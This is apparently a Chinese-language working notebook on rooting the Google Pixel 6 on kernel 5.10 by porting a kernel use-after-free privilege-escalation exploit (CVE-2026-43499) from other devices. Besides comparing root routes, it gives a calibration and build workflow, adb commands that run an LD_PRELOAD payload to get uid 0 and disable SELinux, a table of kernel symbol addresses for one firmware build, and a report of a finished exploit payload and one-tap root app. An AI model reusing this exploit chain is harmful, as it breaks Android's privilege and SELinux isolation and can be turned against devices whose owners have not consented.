# Pixel 6 (内核 5.10) Root 方案调研

> 调研日期：2026-08-23
> 目标：Google Pixel 6 / 6 Pro / 6a（oriole / raven / bluejay），内核 5.10（Android 12 / 13 停留版）
> 结论先行：**CVE-2026-43499 (GhostLock) 可移植到 5.10 内核**——已有多个 5.10 先例（Amazon Fire / Xiaomi XIG04 / Honor 80 GT / MediaTek MT6983V）。Pixel 6 5.10 尚无现成 profile，需按 5.10 定标流程自行移植（与 S24 6.1 定标流程同源，但 rt_mutex_waiter 布局、BTF 可用性、物理基址来源不同）。

---

## 一、背景：Pixel 6 的内核版本史

| Android 版本 | 内核 | KMI | 说明 |
|---|---|---|---|
| Android 12（出厂） | 5.10.x-android12-9 | `android12-5.10` | Tensor GS101 出厂内核 |
| Android 13 | 5.10.x-android13 | `android13-5.10` | 停留 5.10 |
| Android 14+ | 6.1.157-android14-11 | `android14-6.1` | **内核随大版本升级到 6.1**（Google 提供升级） |

> 关键点：**Root-My-Pixel 的 Pixel 6 profile 用的是 6.1.157-android14-11（Android 14 后的内核），不是 5.10**。
> 若设备停留在 Android 12/13（5.10 内核），Root-My-Pixel 的现成 profile 不适用，需要 5.10 内核移植。

## 二、方案总览

| 方案 | 内核 | 是否需解锁 BL | 现成度 | 适用场景 |
|---|---|---|---|---|
| **A. 升级系统后用 Root-My-Pixel** | 6.1（Android 14+） | 否（锁 BL 可） | **现成** | 愿意升级系统、锁 BL |
| **B. GhostLock 5.10 移植** | 5.10（Android 12/13） | 否 | 需自行定标 | 必须停留 5.10、锁 BL |
| **C. 解锁 BL + KernelSU 刷入** | 5.10 / 6.1 均可 | **是** | 现成 | BL 可解锁（非 Verizon 版） |
| **D. 旧漏洞方案（历史）** | 5.10（Android 12/13） | 否 | 已过期 | 仅研究参考 |

## 三、方案 B 详解：CVE-2026-43499 移植到 5.10 内核

### 3.1 漏洞适用性

CVE-2026-43499 是 `kernel/locking/rtmutex.c` `remove_waiter()` 的 use-after-free（`futex_requeue` 代理锁回滚路径误用 `current` 而非 `waiter->task`）。**影响 Linux 2.6.39 – 6.18.x**，5.10.136 在范围内（`CONFIG_FUTEX_PI=y` + `CONFIG_RT_MUTEXES=y`）。

### 3.2 已有 5.10 先例（按相关性排序）

| 项目 | 设备 | 内核 | 平台 | 状态 |
|---|---|---|---|---|
| [CVE-2026-43499-aristotle](https://github.com/soralis0912/CVE-2026-43499-aristotle) | Xiaomi XIG04（au/KDDI） | **5.10.136-android12-9** | MediaTek，Android 12 | 代码完成，硬件未验证 |
| [GhostLock-5.10](https://github.com/R0rt1z2/GhostLock-5.10) | Amazon Fire Max 11 / Fire TV Stick 4K Max 2nd | 5.10（Fire OS 8） | 多设备 target | 可用 |
| [GhostLock-H80GT](https://github.com/yakidango-official/GhostLock-H80GT) | Honor 80 GT | 5.10.168 | MagicOS 8.0 | PoC |
| [GhostLock_MT6983V_5.10](https://github.com/SetsuNeko/GhostLock_MT6983V_5.10) | MediaTek MT6983V 设备 | 5.10 | Dimensity 9000 | PoC |

### 3.3 5.10 与 6.1（S24 定标基准）的关键差异

| 差异项 | 5.10（Pixel 6 场景） | 6.1（S24 DZF2 场景） |
|---|---|---|
| **rt_mutex_waiter 布局** | 旧的**扁平布局**：13 words → **10 words**（无嵌套 `rt_waiter_node`、无 `wake_state`/`ww_ctx`） | 新嵌套布局 |
| **BTF** | 5.10 GKI **可能无 BTF**（aristotle 即无）→ 结构体偏移需**反汇编恢复**后硬编码 | 有 BTF 可反推 |
| **KASLR 锚点** | 无 `xbl_config` → 动态 info-leak（`slide.c`）+ 静态 DRAM 基址（device tree）+ 运行时 `memstart_addr`/`kimage_voffset` | tracefs / boot_id 双路径 |
| **物理基址** | 5.10 场景 `P0_PHYS_OFFSET` 视平台（MediaTek 0x40000000；Pixel GS101 需从 dts 取） | 0x80000000 |
| **API level** | 编译需 `API=31`（Android 12） | API 34+ |

### 3.4 定标流程（Pixel 6 5.10）

参照 aristotle 移植流程（`ARISTOTLE_CVE43499_PORT.md`）：

```sh
# 1. 提取 boot.img（Pixel 官方 factory image / OTA）
#    解包 payload.bin → boot.img → 提取 vmlinux（vmlinux-to-elf）

# 2. 反推偏移（无 BTF 时反汇编；有 BTF 直接用 pahole）
#    关键符号：init_task / init_cred / kmalloc_caches / ashmem_fops /
#    anon_pipe_buf_ops / nfulnl_logger / selinux 相关

# 3. 生成 target.h（aristotle 生成器，无 --xbl-config）
python3 gen_aristotle_target.py \
  --boot boot.img \
  --pselect-shift 0 \
  --loggers <LOGERS_RVA> \
  --boot-id-data <BOOTID_RVA> \
  --kernel-phys-load <PHYS_LOAD> \
  -o src/target.h

# 4. 编译（API=31 关键）
make -C src clean preload API=31

# 5. 运行
adb push src/build/bin/preload.so /data/local/tmp/preload.so
adb shell 'chmod 0644 /data/local/tmp/preload.so'
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/true'
adb shell '/data/local/tmp/su -c id'
# 成功标志: uid=0(root) ... context=u:r:kernel:s0
#           direct-root-summary root=1 id=1 su=1/... selinux=1->0 uid=0
```

### 3.5 Pixel 6 特有的定标注意点

1. **内核版本**：Pixel 6 出厂 `android12-5.10`，Android 13 为 `android13-5.10`——两者 GKI 构建号不同，偏移需分别定标；Pixel 6a（bluejay）与 6/6 Pro 内核不同。
2. **Tensor GS101 的物理内存布局**：`P0_PHYS_OFFSET` / `P0_KERNEL_PHYS_LOAD` 需从 Pixel 6 的 dts 或 XBL/abl 分区读取（不可套用 MediaTek 的 0x40000000）。
3. **硬编码结构体**：若内核无 BTF，`task_struct` / `pipe_buffer` / `rt_mutex_waiter` 布局须按 5.10 源码 + 反汇编核对（我们的 BYH7 经验：struct page 偏移错误特征 = `cache08/cache10` 读到 vmemmap 地址 `fffffffe` 前缀）。
4. **API=31**：Android 12 需要 `API=31` 编译，否则 payload 加载失败。

## 四、方案 A 详解：升级后直接用 Root-My-Pixel

[Root-My-Pixel](https://github.com/alex193a/Root-My-Pixel)（alex193a）已支持 Pixel 6：

```json
{
  "profileId": "oriole-CP2A.260705.006",
  "codename": "oriole",
  "kernelRelease": "6.1.157-android14-11",
  "buildDisplay": "CP2A.260705.006",
  "exploitAsset": "exploits/oriole-CP2A.260705.006.so",
  "kmi": "android14-6.1"
}
```

- 前置：Pixel 6 升级到 Android 14+（内核升为 6.1）、安装 Shizuku（ADB/无线调试授权）
- 流程：App 内检测设备 → 匹配 profile → 推送 payload → exploit → KernelSU/ReSukiSU late-load
- 优点：**开箱即用、锁 BL 可**；缺点：必须升级系统（放弃 5.10）

## 五、方案 C：解锁 BL + KernelSU

- Pixel 6 除 Verizon 版外 BL 可解锁（`fastboot flashing unlock`，会清数据）
- 解锁后刷入带 KernelSU 的 5.10 内核（[KernelSU](https://github.com/tiann/KernelSU) 支持 5.10）
- 最省事、最稳定；缺点是熔断？——Pixel 无 e-fuse，解锁 BL 永久可重锁，无 KNOX 类顾虑

## 六、方案 D：历史漏洞（仅研究参考）

- [Bad Spin (CVE-2022-20421)](https://github.com/0xkol/badspin)：Binder LPE，Pixel 6 Android 12 时代
- Black Hat 演讲「Two Bugs With One PoC - Rooting Pixel 6 from Android 12 to Android 13」：两个漏洞组合 PoC
- CVE-2023-45798 / CVE-2023-45799：Pixel 6 Android 14（2023-12 安全补丁修复）

> 以上均已被安全补丁修复，仅作原理参考。

---

## 七、建议路线

1. **若可接受升级系统**：方案 A（Root-My-Pixel 现成）最快，锁 BL 无风险
2. **若必须停留 Android 12/13（5.10 内核）且锁 BL**：方案 B（GhostLock 5.10 移植）——参照 aristotle 流程，需 Pixel 6 内核提取与 5.10 定标（估计 20 个符号 + 4 个结构体布局）
3. **若 BL 可解锁**：方案 C（KernelSU 刷入）最稳，推荐

## 八、参考链接

- [Root-My-Pixel](https://github.com/alex193a/Root-My-Pixel)（Pixel 现成 profile，6.1 内核）
- [GhostLock-5.10](https://github.com/R0rt1z2/GhostLock-5.10)（Amazon 5.10 内核）
- [CVE-2026-43499-aristotle](https://github.com/soralis0912/CVE-2026-43499-aristotle)（XIG04，5.10.136-android12，MediaTek——与 Pixel 6 场景最接近）
- [CVE-2026-43499-4.19-k40](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40)（Qualcomm 4.19，LD_PRELOAD 形式）
- [GhostLock-SELinux-Disabler](https://github.com/PeronGH/ghostlock-selinux-disabler)
- [rmx3888-cve-2026-43499-config](https://github.com/Bailan766/rmx3888-cve-2026-43499-config)（20 个已验证偏移示例）
- [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia)（漏洞原发）
- [GhostLock 4.19 README](https://raw.githubusercontent.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40/main/README.md)（原理）
- [Black Hat: Two Bugs With One PoC](https://www.classcentral.com/course/youtube-two-bugs-with-one-poc-rooting-pixel-6-from-android-12-to-android-13-250998)（历史方案）
- [Android 官方内核构建文档](https://source.android.com/docs/setup/build/building-kernels)（boot.img 提取与 vmlinux 构建）

---

## 九、Pixel 6 (AP4A.250205.002) 定标实测（2026-08-23）

### 9.1 素材与提取

- boot 镜像：`boot-pixel6.img`（64 MiB，Android bootimg header v4，kernel lz4_legacy）
- 内核：`5.10.214-android13-4-00015-g54748cd9e76c-ab12786721`（Tensor G1 / GS101）
- 解包：`magiskboot unpack` → kernel（24 MB 压缩 / 51.7 MB 解压）
- 转 ELF：vmlinux-to-elf → `vmlinux_pixel6.elf`（59 MB，**145,588 符号**，基址 `ffffffc008000000`）
- **BTF：无** → 结构体布局需反汇编恢复（与 aristotle 5.10 场景一致）

### 9.2 已提取符号 RVA（相对 `KIMAGE_TEXT_BASE = ffffffc008000000`）

| 符号 | RVA | 地址 |
|---|---|---|
| init_task | 0x000304c0c0 | ffffffc00b04c0c0 |
| init_cred | 0x0003020b00 | ffffffc00b020b00 |
| kmalloc_caches | 0x0002526038 | ffffffc00a526038 |
| ashmem_fops | 0x00024d8e30 | ffffffc00a4d8e30 |
| misc_fops | 0x000247f7b0 | ffffffc00a47f7b0 |
| random_fops | 0x000247f550 | ffffffc00a47f550 |
| urandom_fops | 0x000247f670 | ffffffc00a47f670 |
| anon_pipe_buf_ops | 0x00023833e8 | ffffffc00a3833e8 |
| nfulnl_logger | 0x0002f30d98 | ffffffc00af30d98 |
| security_hook_heads | 0x0002522f10 | ffffffc00a522f10 |
| selinux_state | 0x00031b69a0 | ffffffc00b1b69a0 |
| selinux_blob_sizes | 0x00025252f0 | ffffffc00a5252f0 |
| sysctl_bootid | 0x00031d2281 | ffffffc00b1d2281 |
| root_task_group | 0x0003163a80 | ffffffc00b163a80 |
| init_uts_ns | 0x00030a81c8 | ffffffc00b0a81c8 |
| empty_zero_page | 0x000315f000 | ffffffc00b15f000 |
| memstart_addr | 0x0002526028 | ffffffc00a526028 |
| kimage_voffset | 0x0002526030 | ffffffc00a526030 |

### 9.3 与 S24 DZF2 (6.1.145) 偏移对比

| 符号 | Pixel 6 (5.10) RVA | S24 DZF2 (6.1) RVA | 差异 |
|---|---|---|---|
| init_task | 0x0304c0c0 | ~0x0224f8c0* | +0xdfc800 |
| kmalloc_caches | 0x02526038 | 0x0176cbb8 | +0xdb9480 |
| ashmem_fops | 0x024d8e30 | 0x013d1140 | +0x1107cf0 |
| anon_pipe_buf_ops | 0x023833e8 | 0x01219d90* | +0x1169658 |

> *DZF2 值取自 target.h；5.10 与 6.1 差异巨大，且 5.10 的 `rt_mutex_waiter` 为扁平布局（10 words vs 6.1 的 13 words），结构体偏移需按 5.10 源码重新核对——**不可套用 6.1 target.h 结构体常量**。

### 9.4 待定标项（下一步）

> **更新（2026-08-23）：以下项目已全部完成**——结构体布局（反汇编验证 + 2 处修正）、物理常量（DRAM 0x80000000）、exploit 工程（基于 aristotle fork）、编译参数（API=35）均已定标并编译出 preload.so 双变体（0x3e0/0x400）。详见 `02_exploit工程/pixel6-ghostlock/ADAPTATION.md`。

1. ✅ **结构体布局**（无 BTF，反汇编 + 5.10 源码核对）：
   - ✅ `rt_mutex_waiter`（扁平 10 words）→ slide/fops 伪造表
   - ✅ `task_struct`（cred 0x778/0x780、pi_lock 0x86c、pi_blocked_on 0x898）
   - ✅ `pipe_buffer`（pipe_write 反汇编验证）
   - ✅ `struct page`（mm_alloc memset 实测 0x3e0）
2. ✅ **物理内存常量**（Tensor GS101）：
   - ✅ `P0_PHYS_OFFSET=0x80000000`（Project Zero 实测 + dts 交叉验证）
   - ✅ `P0_KERNEL_PHYS_LOAD=0x80000000`（text_offset=0x0，physdiag 真机判据）
3. ✅ **exploit 工程**：基于 [aristotle](https://github.com/soralis0912/CVE-2026-43499-aristotle) fork（5.10 + 无 BTF），已定标 Pixel 6 target
4. ✅ **编译参数**：API=35（Android 15），preload.so 已编译（含 physdiag 诊断）
5. ✅ **交付 App**：RootMyPixel6 核心功能 App（Shizuku 授权 + 内置双载荷 + 一键触发 + 实时日志 + root 检测）

### 9.5 工作产物位置

- `~/下载/boot-pixel6.img`（原始 boot 镜像）
- `/home/nt/项目/pixel6_work/kernel`（解压内核）
- `/home/nt/项目/pixel6_work/vmlinux_pixel6.elf`（含符号 ELF，59 MB）
- `~/下载/pixel6-preload.so` / `pixel6-preload-mmsz400.so`（载荷双变体）
- `~/下载/RootMyPixel6-v1.0-debug.apk`（核心功能 App）
- `02_exploit工程/pixel6-ghostlock/`（完整适配记录 + App 源码）
- **剩余**：真机验证（待 Pixel 6 设备到位）

